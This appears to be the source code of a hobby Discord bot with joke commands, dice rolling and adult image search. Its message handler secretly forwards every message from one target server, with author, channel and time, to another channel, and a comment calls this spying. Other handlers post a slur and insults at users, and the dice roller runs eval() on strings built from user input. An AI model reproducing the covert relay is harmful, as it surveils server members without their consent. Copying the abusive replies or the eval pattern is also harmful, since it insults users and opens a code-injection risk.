import os

import discord
from dotenv import load_dotenv
import random
import pyfiglet
import requests
import re
import horny
from seriouscommand import command

load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')
TARGET_SERVER_1 = os.getenv('TARGET_SERVER_1')
OUTPUT_CHANNEL_1 = os.getenv('OUTPUT_CHANNEL_1')

ballcontent = [
    ":8ball: nope",
    ":8ball: lol no",
    ":8ball: nah"
    ":8ball: not happening ever",
    ":8ball: go ask ur mom",
    ":8ball: ok yeah i guess",
    ":8ball: maybe so",
    ":8ball: i don't think so, but i am not sure",
    ":8ball: 8ball machine :b:roke",
    ":8ball: yea definitely lol",
    ":8ball: isn't it obvious?",
    ":8ball: lmao yeah",
    ":8ball: yes",
    ":8ball: no fuck you",
    ":8ball: no fuck off",
    ":8ball: lol"
]

client = discord.Client()

def randomlistitem(listname):
    return listname[random.randint(0, len(listname) - 1 )]

def stripprefix(text, prefix): # it looks better ok
    return text.split(prefix, 1)[1]


@client.event
async def on_ready():
    print('We have logged in as {0.user}'.format(client))
    game = discord.Game("smeg help")
    await client.change_presence(status=discord.Status.online, activity=game)

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.guild.id == TARGET_SERVER_1:   # spies on a certain server, if you are in that server congratulations
        header = "#" + str(message.channel) + " - [" + str(message.author) + "] " + str(message.created_at.utcnow())[0:-7] + " UTC\n"
        channel = client.get_channel(OUTPUT_CHANNEL_1)  # output channel
        await channel.send(header + message.content)

    if message.content.startswith("smeg "):
        text = stripprefix(message.content, "smeg ")
        await message.channel.send(command(text))

    if "sex" in message.content:
        await message.channel.send("sex")

    if message.content.startswith("8ball"):
        text = randomlistitem(ballcontent)
        await message.channel.send(text)

    if "big" in message.content:
        text = stripprefix(message.content, "big")
        if text[0] == " ":
            text = stripprefix(text, " ")
        bigtext = pyfiglet.figlet_format(text)
        await message.channel.send("```\n" + bigtext + "\n```")

    if message.author.id == 365975655608745985: # Pokecord
        if message.content == "This is the wrong pokémon!":
            await message.channel.send("haha what a fucking retard")
        elif message.content.startswith("Congratulations"):
            await message.channel.send("wow ok nice reverse image search loser")
            await message.channel.send("ok now check the iv or ban")

    if message.content.startswith("gelbooru "):
        text = stripprefix(message.content, "gelbooru ")
        posts = horny.gelbooru(text)
        print("a")
        try:
            imgurl = []
            for post in posts:
                imgurl.append(post.attrib['file_url'])
            text = randomlistitem(imgurl)
            await message.channel.send(text)
            print("g")
        except (ValueError, IndexError):
            print("e")
            await message.channel.send("zero results, you clown")
            await message.channel.send("are you sure you know your tags? :thinking:")

    if message.content.startswith("e621 "):
        text = stripprefix(message.content, "e621 ")
        posts = horny.e621(text)
        await message.channel.send(posts)

    if message.content.startswith("roll "):
        text = stripprefix(message.content, "roll ")
        if "d" in text: # standard dice notation with basic arithmetic
            splittext = re.split("([-+*/])", text)
            result = splittext[:] # copies value
            for diceroll in splittext[::2]: # even indices
                if not "d" in diceroll: # the notation is wrong somehow
                    await message.channel.send("good job dumbass you messed up the notation")
                    return 0
                dicecalc = diceroll.split("d")
                subresult = 0
                if dicecalc[0] == "":
                    dicecalc[0] = 1
                for i in range(0, int(dicecalc[0])):
                    subresult += random.randint(1, int(dicecalc[1]))
                for index, value in enumerate(result):
                    if value == diceroll:
                        result[index] = str(subresult)
            finalresult = eval("".join(result))
            await message.channel.send(":game_die: **" + str(finalresult) + "**")

        if "%" in text:
            splittext = re.split("([-+*/])", text)
            result = splittext[:]  # copies value
            for percentage in splittext[::2]:  # even indices
                if not "%" in percentage:  # the notation is wrong somehow
                    await message.channel.send("good job dumbass you messed up the notation")
                    return 0
                fraction = percentage.replace("%", "")
                fraction = str(round(float(fraction)) / 100)
                for index, value in enumerate(result):
                    if value == percentage:
                        result[index] = str(fraction)
            finalresult = int(eval("".join(result)) * 100)
            if random.randint(1,100) <= finalresult:
                rngbool = ":white_check_mark:"
            else:
                rngbool = ":negative_squared_cross_mark:"
            await message.channel.send(":game_die: **" + str(finalresult) + "%**: " + rngbool)

client.run(TOKEN)
